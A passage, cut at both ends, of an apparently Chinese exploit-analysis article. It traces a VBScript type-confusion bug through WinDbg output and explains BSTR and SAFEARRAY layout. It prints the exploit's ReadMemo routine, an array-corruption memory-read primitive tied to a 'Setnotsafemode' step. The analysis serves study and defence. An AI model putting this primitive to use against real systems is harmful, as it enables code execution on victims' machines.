<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84f0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L4</span>
<span class="mi">0249</span><span class="n">cb1c</span>  <span class="mi">6</span><span class="n">fb13991</span> <span class="mi">0013</span><span class="n">ebf0</span> <span class="mi">02</span><span class="n">e678f8</span> <span class="mi">01</span><span class="n">df84f0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df84f0</span> <span class="n">L4</span>
<span class="mi">01</span><span class="n">df84f0</span>  <span class="mi">0000400</span><span class="n">c</span> <span class="mi">00000000</span> <span class="mi">0013268</span><span class="n">c</span> <span class="mi">41</span><span class="n">a00001</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">0013268</span><span class="n">c</span> <span class="n">L4</span>
<span class="mi">0013268</span><span class="n">c</span>  <span class="mi">00000001</span> <span class="mi">00000080</span> <span class="mi">01</span><span class="n">df8718</span> <span class="mi">01000</span><span class="n">f0e</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">ln</span> <span class="n">poi</span><span class="o">(</span><span class="mi">01</span><span class="n">df8718</span><span class="o">)</span>
<span class="o">(</span><span class="mi">6</span><span class="n">fb04934</span><span class="o">)</span>   <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptEntryPoint</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="s1">&#39;   |  (6fb1ab54)   vbscript!CEntryPointDispatch::`vftable&#39;</span>
<span class="n">Exact</span> <span class="n">matches</span><span class="o">:</span>
    <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptEntryPoint</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">&#39;</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">no</span> <span class="n">type</span> <span class="n">information</span><span class="o">&gt;</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc10</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0013</span><span class="n">f274</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000001</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb18</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L20</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">18</span> <span class="mi">87</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">0</span><span class="n">e</span> <span class="mi">0</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">01</span>  <span class="o">................</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84f0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000002</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L4</span>
<span class="mi">0249</span><span class="n">cb1c</span>  <span class="mi">6</span><span class="n">fb13991</span> <span class="mi">0013</span><span class="n">ebf0</span> <span class="mi">02</span><span class="n">e678f0</span> <span class="mi">01</span><span class="n">df84f0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678f0</span> <span class="n">L10</span>
<span class="mi">02</span><span class="n">e678f0</span>  <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">01</span><span class="n">df84f0</span> <span class="n">L10</span>
<span class="mi">01</span><span class="n">df84f0</span>  <span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc10</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0013</span><span class="n">f23c</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000001</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb18</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L20</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">18</span> <span class="mi">87</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">0</span><span class="n">e</span> <span class="mi">0</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">01</span>  <span class="o">................</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84f0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc10</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0013</span><span class="n">f274</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000001</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb18</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L40</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">18</span> <span class="mi">87</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">0</span><span class="n">e</span> <span class="mi">0</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">01</span>  <span class="o">................</span>
<span class="mi">02</span><span class="n">e67908</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">02</span><span class="n">e67918</span>  <span class="mi">08</span> <span class="mi">00</span> <span class="mi">49</span> <span class="mi">02</span> <span class="n">a5</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">14</span> <span class="mi">50</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">18</span> <span class="n">cc</span> <span class="mi">49</span> <span class="mi">02</span>  <span class="o">..</span><span class="n">I</span><span class="o">......</span><span class="n">P</span><span class="err">@</span><span class="o">...</span><span class="n">I</span><span class="o">.</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">00405014</span><span class="o">-</span><span class="mi">4</span> <span class="n">L8</span>
<span class="mi">00405010</span>  <span class="mi">00000018</span> <span class="mi">08800001</span> <span class="mi">00000001</span> <span class="mi">00000000</span>
<span class="mi">00405020</span>  <span class="mi">00000000</span> <span class="mi">7</span><span class="n">fff0000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84f0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000002</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb2c</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb00</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L40</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">18</span> <span class="mi">87</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">0</span><span class="n">e</span> <span class="mi">0</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">01</span>  <span class="o">................</span>
<span class="mi">02</span><span class="n">e67908</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">02</span><span class="n">e67918</span>  <span class="mi">0</span><span class="n">c</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">0</span><span class="n">c</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">14</span> <span class="mi">50</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">18</span> <span class="n">cc</span> <span class="mi">49</span> <span class="mi">02</span>  <span class="o">.</span> <span class="o">...</span> <span class="o">...</span><span class="n">P</span><span class="err">@</span><span class="o">...</span><span class="n">I</span><span class="o">.</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">ole32</span><span class="o">!</span><span class="n">tagSAFEARRAY</span> <span class="mi">00405014</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="n">cDims</span>            <span class="o">:</span> <span class="mi">1</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="n">fFeatures</span>        <span class="o">:</span> <span class="mh">0x880</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="n">cbElements</span>       <span class="o">:</span> <span class="mi">1</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="n">cLocks</span>           <span class="o">:</span> <span class="mi">0</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">pvData</span>           <span class="o">:</span> <span class="o">(</span><span class="kc">null</span><span class="o">)</span> 
   <span class="o">+</span><span class="mh">0x010</span> <span class="n">rgsabound</span>        <span class="o">:</span> <span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="n">tagSAFEARRAYBOUND</span>
</pre></div>


<p>我们知道字符串在内存中是以BSTR对象保存的，暂不论类型混淆，就myarray字符串而言，它在内存中的保存结果如下，Data High字段中的指针0x00405014指向相应的字符内容：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/4.png-w331s" />
<center><small>图4&nbsp;&nbsp;内存中的myarray</small></center></p>
<p>其中，BSTR对象头部表示字符串的长度，此情况中即为poi(0x00405014-4)=0x18。</p>
<p>了解这一点后，我们再来看实现Read primitive的函数：</p>
<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">ReadMemo</span><span class="p">(</span><span class="nx">add</span><span class="p">)</span>  <span class="s1">&#39;借助类型混淆来读取add地址处的值&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a2</span><span class="p">)</span>  <span class="s1">&#39;对aa数组进行corrupt&#39;</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span>
  <span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">)</span><span class="o">=</span><span class="nx">add</span><span class="o">+</span><span class="mi">4</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mf">1.69759663316747</span><span class="nx">E</span><span class="o">-</span><span class="mi">313</span>  <span class="s1">&#39;0x0000000800000008&#39;</span>
  <span class="nx">ReadMemo</span><span class="o">=</span><span class="nx">lenb</span><span class="p">(</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">))</span>  <span class="s1">&#39;read primitive&#39;</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>  <span class="s1">&#39;恢复aa数组至corrupt前&#39;</span>
<span class="nx">end</span> <span class="kd">function</span>
</pre></div>


<p>首先add+4会以long integer(0x03)类型赋给aa(a1)，这里add为要读取的地址，而后aa(a1)的类型被改成了string(0x08)，于是add+4也就被当成了指向字符内容的指针，因此lenb(aa(a1))就等价于poi(add+4-4)，即add地址处的值。</p>
<p>对于Setnotsafemode函数中的如下ReadMemo调用：</p>
<div class="codehilite"><pre><span></span>On Error Resume Next
i=Mydata()  &#39;获取testaa函数对象指针，即CScriptEntryPoint对象指针&#39;
i=ReadMemo(i+8)
</pre></div>


<p>其跟踪过程如下：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
